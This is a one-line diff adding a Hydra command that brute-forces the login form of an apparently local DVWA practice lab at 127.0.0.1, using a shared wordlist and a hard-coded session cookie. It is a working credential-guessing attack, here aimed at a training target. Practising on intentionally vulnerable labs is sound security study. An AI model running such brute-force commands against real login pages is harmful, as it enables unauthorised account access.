@@ -1,0 +1,1 @@
+hydra -L buteforce.txt -P buteforce.txt 'http-get-form://127.0.0.1/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=8kdvhdjdaics2eqjnfpguhi5k0; security=low:F=Username and/or password incorrect'
